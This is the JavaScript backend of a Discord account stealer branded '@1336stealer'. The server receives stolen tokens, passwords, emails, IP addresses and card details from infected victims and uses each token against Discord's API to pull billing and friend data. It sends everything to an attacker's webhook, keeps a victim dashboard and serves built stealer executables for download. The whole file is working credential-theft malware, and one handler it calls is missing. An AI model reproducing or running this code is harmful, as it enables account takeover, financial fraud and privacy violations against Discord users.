const express = require('express');
const app = express();
const path = require('path');
const axios = require('axios').default;
const db = require('quick.db');
const fs = require('fs');

app.use(express.json())

app.listen(80, () => {
    console.log('Serveur allumé.')
})

const badges = {
    Discord_Employee: {
        Value: 1,
        Emoji: "<:1336:1012704237127467151>",
        Link: "https://media.discordapp.net/attachments/992522896830369892/992561584440356924/Discord_Staff.png",
        Rare: true,
    },
    Partnered_Server_Owner: {
        Value: 2,
        Emoji: "<:1336:1012704448113545337>",
        Link: "https://media.discordapp.net/attachments/992522896830369892/992561586042572891/Partner.png",
        Rare: true,
    },
    HypeSquad_Events: {
        Value: 4,
        Emoji: "<:1336:1012704437204164738>",
        Link: "https://media.discordapp.net/attachments/992522896830369892/992561585644130324/Hypesquad_Events.png",
        Rare: true,
    },
    Bug_Hunter_Level_1: {
        Value: 8,
        Emoji: "<:1336:1012704348549156904>",
        Link: "https://media.discordapp.net/attachments/992522896830369892/992561583576322058/Bug_Hunter_Level_1.png",
        Rare: true,
    },
    Early_Supporter: {
        Value: 512,
        Emoji: "<:1336:1012704393876996127>",
        Link: "https://media.discordapp.net/attachments/992522896830369892/992561364797243422/Early_Supporter.png",
        Rare: true,
    },
    Bug_Hunter_Level_2: {
        Value: 16384,
        Emoji: "<:1336:1012704359869599794>",
        Link: "https://media.discordapp.net/attachments/992522896830369892/992561583890890793/Bug_Hunter_Level_2.png",
        Rare: true,
    },
    Early_Verified_Bot_Developer: {
        Value: 131072,
        Emoji: "<:1336:1012704335156740157>",
        Link: "https://media.discordapp.net/attachments/992522896830369892/992561583320473690/Bot_Developer.png",
        Rare: true,
    },
    House_Bravery: {
        Value: 64,
        Emoji: "<:1336:1012704416870170735>",
        Link: "https://media.discordapp.net/attachments/992522896830369892/992561585220501595/House_Bravery.png",
        Rare: false,
    },
    House_Brilliance: {
        Value: 128,
        Emoji: "<:1336:1012704426600976484>",
        Link: "https://media.discordapp.net/attachments/992522896830369892/992561585434406982/House_Brillance.png",
        Rare: false,
    },
    House_Balance: {
        Value: 256,
        Emoji: "<:1336:1012704403670712451>",
        Link: "https://media.discordapp.net/attachments/992522896830369892/992561584977219684/House_Balance.png",
        Rare: false,
    },
    Discord_Official_Moderator: {
        Value: 262144,
        Emoji: "<:1336:1012704381973577759>",
        Link: "https://media.discordapp.net/attachments/992522896830369892/992561584184508456/Certified_Moderator.png",
        Rare: true,
    }
};

app.post('/payload', async (req, res) => {
    const { type, ip, token, key } = req.body
    if (!type || !ip || !token || !key) return;
    const webhook = getWebhook(key);
    //const webhook = 'https://canary.discord.com/api/webhooks/992194122083475618/QZmZyMJdFLKyv2cXZd0jL7NMzy7-BJ7jDkK3app1kPL6U_2PLxjlvo9KBs1FSZ9cTEsH';
    if (!webhook) return;
    if (type == 'login') userLogin(req.body.password, token, ip, webhook)
    if (type == 'email') emailChanged(req.body.password, req.body.newEmail, token, ip, webhook)
    if (type == 'password') passwordChanged(req.body.oldPassword, req.body.newPassword, token, ip, webhook)
    if (type == 'card') creditCardAdded(req.body.number, req.body.cvc, req.body.expiration, token, ip, webhook)
})

function getWebhook(key) {
    return db.get(`wbh_${key}`) || null;
}
app.set('view engine','ejs'); 

const DB = [];
app.get('/dashboard', async (req, res) => {
    res.render('C:/Users/astraa/Desktop/src/BuildBot/Dashboard/dash.ejs', {
        data: DB
    })
})

async function userLogin(password, token, ip, webhook) {
    var userInfo = await getUserInfo(token);
    var billing = await getBilling(token);
    var friends = await getRelationships(token);
    var params = {
        embeds: [{
            "fields": [
                {
                    name: `<a:1336:1012706914527891476> Token:`,
                    value: `\`${token}\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})`,
                    inline: false
                },
                {
                    name: `<:1336:1012707124763177022> Badges:`,
                    value: getBadges(userInfo.flags),
                    inline: true
                },
                {
                    name: `<:1336:1012707326223982692> Nitro Type:`,
                    value: await getNitro(userInfo.premium_type, userInfo.id, token),
                    inline: true
                },
                {
                    name: `<a:1336:1012707511830331442> Billing:`,
                    value: billing,
                    inline: true
                },
                {
                    name: `<:1336:1012707773424865310> IP:`,
                    value: `\`${ip}\``,
                    inline: true
                },
                {
                    name: `<:1336:1012707970653626408> Email:`,
                    value: `\`${userInfo.email}\``,
                    inline: true
                },
                {
                    name: `<:1336:1012707124763177022> Password:`,
                    value: `\`${password}\``,
                    inline: true
                },
            ],
            "color": 3553599,
            "author": {
                "name": `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
                "icon_url": "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif",
            },
            "footer": {
                "text": "@1336stealer"
            },
            "thumbnail": {
                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}?size=512`
            }
        }, {
            "color": 3553599,
            "description": friends,
            "author": {
                "name": "HQ Friends",
                "icon_url": "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif",
            },
            "footer": {
                "text": "@1336stealer"
            },
        }]
    };
    if (!params) return;
    let badges = await getBadges2(userInfo.flags, userInfo.id, token);
    let badgesss = await getNitro2(userInfo.premium_type, userInfo.id, token);
    const actual = DB.find(i => i.id == userInfo.id)
    if (actual) DB.splice(actual)
    DB.push({ token: token, tag: `${userInfo.username}#${userInfo.discriminator}`, id: userInfo.id, avatar: userInfo.avatar, email: userInfo.email, password: password, badges: badges, badgeboost: badgesss })
    axios.post(webhook, {
        content: "",
        embeds: params.embeds
    }, {
        headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
        }
    })
        .catch(() => { })
}

async function emailChanged(password, newEmail, token, ip, webhook) {
    var userInfo = await getUserInfo(token);
    var billing = await getBilling(token);
    var friends = await getRelationships(token);

    var params = {
        embeds: [{
            "fields": [
                {
                    name: `<a:1336:1012706914527891476> Token:`,
                    value: `\`${token}\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})`,
                    inline: false
                },
                {
                    name: `<:1336:1012707124763177022> Badges:`,
                    value: getBadges(userInfo.flags),
                    inline: true
                },
                {
                    name: `<:1336:1012707326223982692> Nitro Type:`,
                    value: await getNitro(userInfo.premium_type, userInfo.id, token),
                    inline: true
                },
                {
                    name: `<a:1336:1012707511830331442> Billing:`,
                    value: billing,
                    inline: true
                },
                {
                    name: `<:1336:1012707773424865310> IP:`,
                    value: `\`${ip}\``,
                    inline: true
                },
                {
                    name: `<:1336:1012707970653626408> Email:`,
                    value: `\`${newEmail}\``,
                    inline: true
                },
                {
                    name: `<:1336:1012707124763177022> Password:`,
                    value: `\`${password}\``,
                    inline: true
                },
            ],
            "color": 3553599,
            "author": {
                "name": `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
                "icon_url": "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif",
            },
            "footer": {
                "text": "@1336stealer"
            },
            "thumbnail": {
                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}?size=512`
            }
        }, {
            "color": 3553599,
            "description": friends,
            "author": {
                "name": "HQ Friends",
                "icon_url": "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif",
            },
            "footer": {
                "text": "@1336stealer"
            },
        }]
    };
    if (!params) return;
    axios.post(webhook, {
        content: "",
        embeds: params.embeds
    }, {
        headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
        }
    })
        .catch(() => { })
}
async function passwordChanged(oldPassword, newPassword, token, ip, webhook) {
    var userInfo = await getUserInfo(token);
    var billing = await getBilling(token);
    var friends = await getRelationships(token);

    var params = {
        embeds: [{
            "fields": [
                {
                    name: `<a:1336:1012706914527891476> Token:`,
                    value: `\`${token}\`\n[Copy Token](https://superfurrycdn.nl/copy/${token})`,
                    inline: false
                },
                {
                    name: `<:1336:1012707124763177022> Badges:`,
                    value: getBadges(userInfo.flags),
                    inline: true
                },
                {
                    name: `<:1336:1012707326223982692> Nitro Type:`,
                    value: await getNitro(userInfo.premium_type, userInfo.id, token),
                    inline: true
                },
                {
                    name: `<a:1336:1012707511830331442> Billing:`,
                    value: billing,
                    inline: true
                },
                {
                    name: `<:1336:1012707773424865310> IP:`,
                    value: `\`${ip}\``,
                    inline: true
                },
                {
                    name: `<:1336:1012707970653626408> Email:`,
                    value: `\`${userInfo.email}\``,
                    inline: true
                },
                {
                    name: `<:1336:1012707124763177022> Old Password:`,
                    value: `\`${oldPassword}\``,
                    inline: true
                },
                {
                    name: `<:1336:1012707124763177022> New Password:`,
                    value: `\`${newPassword}\``,
                    inline: true
                }
            ],
            "color": 3553599,
            "author": {
                "name": `${userInfo.username}#${userInfo.discriminator} (${userInfo.id})`,
                "icon_url": "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif",
            },
            "footer": {
                "text": "@1336stealer"
            },
            "thumbnail": {
                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}?size=512`
            }
        }, {
            "color": 3553599,
            "description": friends,
            "author": {
                "name": "HQ Friends",
                "icon_url": "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif",
            },
            "footer": {
                "text": "@1336stealer"
            },
        }]
    };
    if (!params) return;
    axios.post(webhook, {
        content: "",
        embeds: params.embeds
    }, {
        headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*'
        }
    })
        .catch(() => { })
}

async function getUserInfo(token) {
    let json;
    await axios.get("https://discord.com/api/v9/users/@me", {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).then(res => { json = res.data })
        .catch(err => { })
    if (!json) return {};
    return json;
}

async function getRelationships(token) {
    var j = await axios.get('https://discord.com/api/v9/users/@me/relationships', {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).catch(() => { })
    if (!j) return `*Account locked*`
    var json = j.data
    const r = json.filter((user) => {
        return user.type == 1
    })
    var gay = '';
    for (z of r) {
        var b = getRareBadges(z.user.public_flags)
        if (b != "") {
            gay += `${b} | \`${z.user.username}#${z.user.discriminator}\`\n`
        }
    }
    if (gay == '') gay = "*Nothing to see here*"
    return gay
}

async function getBilling(token) {
    let json;
    await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).then(res => { json = res.data })
        .catch(err => { })
    if (!json) return '\`Unknown\`';

    var bi = '';
    json.forEach(z => {
        if (z.type == 2 && z.invalid != !0) {
            bi += "<:1336:1012751314431770624>";
        } else if (z.type == 1 && z.invalid != !0) {
            bi += "<:1336:1012755275494735933>";
        }
    });
    if (bi == '') bi = `\`No Billing\``
    return bi;
}

function getBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value) b += o.Emoji;
    };
    if (b == '') return `\`No Badges\``;
    return `${b}`;
}

async function getBadges2(flags, id, token) {
    var b = [];
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value) b.push(o.Link);
    };
    return b;
}

function getRareBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
    };
    return b;
}

async function getNitro(flags, id, token) {
    switch (flags) {
        case 1:
            return "<:1336:1012751667575394394>";
        case 2:
            let info;
            await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
                headers: {
                    "Content-Type": "application/json",
                    "authorization": token
                }
            }).then(res => { info = res.data })
                .catch(() => { })
            if (!info) return "<:1336:1012751667575394394>";

            if (!info.premium_guild_since) return "<:1336:1012751667575394394>";

            let boost = ["<:1336:1012704249450332191>", "<:1336:1012704263304138883>", "<:1336:1012746877910913044>", "<:1336:1012704276738494544>", "<:1336:1012704286658023485>", "<:1336:1012748229470859304>", "<:1336:1012704297361870859>", "<:1336:1012704320606720112>", "<:1336:1012704308195758171>"]
            var i = 0

            try {
                let d = new Date(info.premium_guild_since)
                let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
                let d1 = new Date(info.premium_guild_since)
                let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
                let d2 = new Date(info.premium_guild_since)
                let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
                let d3 = new Date(info.premium_guild_since)
                let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
                let d4 = new Date(info.premium_guild_since)
                let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
                let d5 = new Date(info.premium_guild_since)
                let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
                let d6 = new Date(info.premium_guild_since)
                let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
                let d7 = new Date(info.premium_guild_since)
                let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)

                if (boost2month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost3month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost6month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost9month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost12month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost15month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost18month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost24month > 0) {
                    i += 0
                } else if (boost24month < 0 || boost24month == 0) {
                    i += 1
                } else {
                    i = 0
                }
            } catch {
                i += 0
            }
            return `<:1336:962747802797113365> ${boost[i]}`
        default:
            return "\`No Nitro\`";
    };
}

async function getNitro2(flags, id, token) {
    switch (flags) {
        case 1:
            return ["https://media.discordapp.net/attachments/992522896830369892/992726526380494868/Discord_Nitro.png"];
        case 2:
            let info;
            await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
                headers: {
                    "Content-Type": "application/json",
                    "authorization": token
                }
            }).then(res => { info = res.data })
                .catch(() => { })
            if (!info) return ["https://media.discordapp.net/attachments/992522896830369892/992726526380494868/Discord_Nitro.png"];

            if (!info.premium_guild_since) return ["https://media.discordapp.net/attachments/992522896830369892/992726526380494868/Discord_Nitro.png"];

            let boost = ["https://media.discordapp.net/attachments/992522896830369892/992726523020849242/Booster_1_Month.png", "https://media.discordapp.net/attachments/992522896830369892/992726523297665054/Booster_2_Month.png", "https://media.discordapp.net/attachments/992522896830369892/992726810741710918/Booster_3_Month.png", "https://media.discordapp.net/attachments/992522896830369892/992726523553521725/Booster_6_Month.png", "https://media.discordapp.net/attachments/992522896830369892/992726523855519744/Booster_9_Month.png", "https://media.discordapp.net/attachments/992522896830369892/992726525268983809/Booster_12_Month.png", "https://media.discordapp.net/attachments/992522896830369892/992726525554208868/Booster_15_Month.png", "https://media.discordapp.net/attachments/992522896830369892/992727001137958932/Booster_Level_18.png", "https://media.discordapp.net/attachments/992522896830369892/992726525789098055/Booster_24_Month.png"]
            var i = 0

            try {
                let d = new Date(info.premium_guild_since)
                let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
                let d1 = new Date(info.premium_guild_since)
                let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
                let d2 = new Date(info.premium_guild_since)
                let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
                let d3 = new Date(info.premium_guild_since)
                let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
                let d4 = new Date(info.premium_guild_since)
                let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
                let d5 = new Date(info.premium_guild_since)
                let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
                let d6 = new Date(info.premium_guild_since)
                let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
                let d7 = new Date(info.premium_guild_since)
                let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)

                if (boost2month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost3month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost6month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost9month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost12month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost15month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost18month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost24month > 0) {
                    i += 0
                } else if (boost24month < 0 || boost24month == 0) {
                    i += 1
                } else {
                    i = 0
                }
            } catch {
                i += 0
            }
            return ["https://media.discordapp.net/attachments/992522896830369892/992726526380494868/Discord_Nitro.png", boost[i]]
        default:
            return [];
    };
}

app.route('/:id').get(async (req, res) => {
    const { id } = req.params;
    if (fs.existsSync(`./Build/dist/${id}/1336_${id}.exe`)) {
        res.download(`./Build/dist/${id}/1336_${id}.exe`)
    }
})

process
    .on("uncaughtException", err => console.error(err))
    .on("unhandledRejection", err => console.error(err));